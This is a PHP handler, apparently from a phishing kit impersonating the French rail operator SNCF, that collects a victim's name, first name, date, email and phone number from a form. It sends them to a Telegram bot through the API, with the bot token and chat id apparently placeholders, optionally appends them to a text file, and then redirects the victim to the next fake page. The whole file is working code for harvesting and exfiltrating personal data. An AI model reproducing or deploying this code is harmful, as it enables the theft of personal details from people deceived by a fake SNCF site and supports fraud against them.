<?php
    if(isset($_POST['subscriptionName']))
    {
        session_start();
        include '../lib/functions.php';
        include '../settings.php';
		
        $fn = $_POST['subscriptionName'];
        $ln = $_POST['subscriptionFirstname'];
        $date = $_POST['date'];
        $email = $_POST['subscriptionEmail'];
        $Tel = $_POST['subscriptionNam'];



        
    	$_SESSION['subscriptionName'] = $fn;
    	$_SESSION['subscriptionFirstname'] = $ln;
    	$_SESSION['date'] = $date;
    	$_SESSION['subscriptionEmail'] = $email;

    	$_SESSION['subscriptionNam'] = $Tel;

    	

	$msg.="#-------------------- SNCF Info --------------------#\r\n";
    	$msg.="Name Fname:       {$fn} {$ln}\r\n";
    	$msg.="date:            {$date}\r\n";
    	$msg.="email:           {$email}\r\n";

    	$msg.="Tel:        {$Tel}\r\n";
		file_get_contents("https://api.telegram.org/bot684485515355:GYGYUGGYUGYUGYUGYU/sendMessage?chat_id=HUIHUIHH&text=".urlencode($msg)."" );
		if($saveintext == "yes") {
			$save=fopen("../".$filename.".txt","a+");
			fwrite($save,$msg);fclose($save);
		}
    	
		exit(header("Location: ../indexx.php"));
    }
?>